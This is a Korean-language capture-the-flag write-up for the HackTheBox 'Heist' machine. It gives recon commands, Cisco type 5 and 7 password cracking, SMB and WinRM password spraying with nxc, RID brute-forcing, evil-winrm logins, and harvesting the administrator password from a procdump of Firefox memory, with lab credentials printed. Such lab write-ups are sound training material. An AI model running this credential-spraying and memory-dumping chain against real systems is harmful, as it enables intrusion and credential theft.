# Heist - HackTheBox
## Recon
```bash
sudo nmap -p 135,445,49669,5985,80 -sC -sV -vv -oA Heist 10.129.96.157
```
<img width="1103" height="374" alt="image" src="https://github.com/user-attachments/assets/89bb969e-0571-4aed-a68f-e378db4787cf" />

- HTTP(80)
- SMB(445)
- WINRM(5985)

---
## HTTP
### banner grabbing
<img width="1103" height="155" alt="image" src="https://github.com/user-attachments/assets/69ce64db-a1f9-4d00-9c11-ccd73cc9f8db" />

<br>
<br>

<img width="1103" height="470" alt="image" src="https://github.com/user-attachments/assets/55813993-1ede-4b17-9b66-e6319a42ab6b" />

### CISCO configuration
- 메인페이지에서 로그인을 시도해보았으나 실패.
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/c4ad8fa3-66d9-496b-9366-85476f2036ab" />

<br>
<br>

- `Login as guest` 링크를 누르면 `issues.php`로 이동.
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/c463ba2b-529d-46ba-82db-04ef57a0e81c" />

<br>
<br>

- `cisco configuration`이라는 언급을 토대로 configuration 파일이라고 가정하여 `Attachment` 클릭.
<img width="558" height="680" alt="image" src="https://github.com/user-attachments/assets/d76a77bb-f5e1-40b2-ac56-1bf2447068c3" />

<br>
<br>

- https://book.hacktricks.wiki/en/generic-hacking/brute-force.html?highlight=cisco#cisco
- 5번 타입의 경우 바로 크래킹이 가능.($1$pdQG$o8nrSzsGXeaduXrjlvKc91)
<img width="1105" height="111" alt="image" src="https://github.com/user-attachments/assets/bb2efe88-4fe8-40fc-9bb9-ed857e5a2f06" />

<br>
<br>

- https://github.com/theevilbit/ciscot7
- 7번 타입의 경우 스크립트를 사용하여 크래킹.
```bash
wget http://10.129.96.157/attachments/config.txt

python3 ciscot7.py -f config.txt
```
<img width="1105" height="94" alt="image" src="https://github.com/user-attachments/assets/8fc01a83-65e4-4b58-9d69-1e7351853905" />

<br>
<br>

- 비밀번호 모두 하나의 파일로 생성.
<img width="1105" height="106" alt="image" src="https://github.com/user-attachments/assets/6ff428ef-bbb1-4d94-904c-b34786f42d4f" />

<br>
<br>

- `admin`과 `rout3r`로 로그인 시도하였으나 실패.
```bash
nxc smb 10.129.96.157 -u users -p passwords
```
<img width="1105" height="240" alt="image" src="https://github.com/user-attachments/assets/57654542-5812-4967-97a6-64e90bf84780" />

<br>
<br>

- `/issues.php`의 `hazard`유저로 로그인 시도하여 성공.
- `winrm`은 로그인 불가.
```bash
nxc smb 10.129.96.157 -u hazard -p passwords
```
<img width="1105" height="111" alt="image" src="https://github.com/user-attachments/assets/648864e4-4077-495e-97bc-1f0bf1cdbf01" />

<br>
<br>

- 내부의 유저들을 탐색.
```bash
nxc smb 10.129.96.157 -u hazard -p stealth1agent --rid-brute
```
<img width="1105" height="283" alt="image" src="https://github.com/user-attachments/assets/610cbb6c-d3aa-4cc2-ad6b-8214a492309d" />

<br>
<br>

- `SidTypeUser` 유저목록 생성.
<img width="1105" height="222" alt="image" src="https://github.com/user-attachments/assets/5f87bd39-6673-464e-86d3-bddc39092eec" />

<br>
<br>

- `winrm`로그인 시도.
```bash
nxc winrm 10.129.96.157 -u users -p passwords
```
<img width="1105" height="30" alt="image" src="https://github.com/user-attachments/assets/9a60e87a-db01-49cd-afdf-9d4e8c9cf1ca" />

<br>
<br>

- `winrm` 로그인.
```bash
evil-winrm -i 10.129.96.157 -u chase -p 'Q4)sJu\Y8qz*A3?d'
```
<img width="1105" height="272" alt="image" src="https://github.com/user-attachments/assets/c9200773-cb8b-49a8-bcc4-67769b072b0e" />

---
## Privesc
- 특별한 정보를 찾지 못해서 현재 실행되고 있는 프로세스를 확인하니 `firefox`가 실행 중.
```powershell
ps
```
<img width="1105" height="306" alt="image" src="https://github.com/user-attachments/assets/80ed6214-1fef-48f6-8199-8d1da65d0f6d" />

<br>
<br>

- https://live.sysinternals.com/
- `procdump.exe`를 다운받아서 `firefox` 덤핑 시도.
```powershell
.\procdump.exe -ma 6320 -accepteula
```
<img width="1105" height="216" alt="image" src="https://github.com/user-attachments/assets/473dcdce-6849-4041-81d1-6e492af80eed" />

<br>
<br>

- 로컬로 다운로드 받아서 확인하여 비밀번호 발견.(다운로드 오래 걸림.)
```bash
strings firefox.exe_260121_141526.dmp|less
```
<img width="1105" height="40" alt="image" src="https://github.com/user-attachments/assets/1cd8cfda-c7c3-419e-adee-a2983c7b6b66" />

<br>
<br>

- `winrm` 로그인 시도.
```bash
nxc winrm 10.129.96.157 -u users -p '4dD!5}x/re8]FBuZ'
```
<img width="1105" height="168" alt="image" src="https://github.com/user-attachments/assets/fb6acf48-715e-408e-9b29-823d991b25ed" />

<br>
<br>

- 셸 획득.
```bash
evil-winrm -i 10.129.96.157 -u administrator -p '4dD!5}x/re8]FBuZ'
```
<img width="1105" height="273" alt="image" src="https://github.com/user-attachments/assets/a5eefddc-84a4-4253-898e-5825caf2371c" />

---
## FLAG
- `c:\users\chase\desktop\user.txt`
<img width="1105" height="209" alt="image" src="https://github.com/user-attachments/assets/cfbef4d1-290a-4968-9157-f91f78826e66" />

<br>
<br>

- `c:\users\administrator\desktop\root.txt`
<img width="1105" height="209" alt="image" src="https://github.com/user-attachments/assets/b335b10d-8a90-43a8-a25b-659e2ef61be3" />
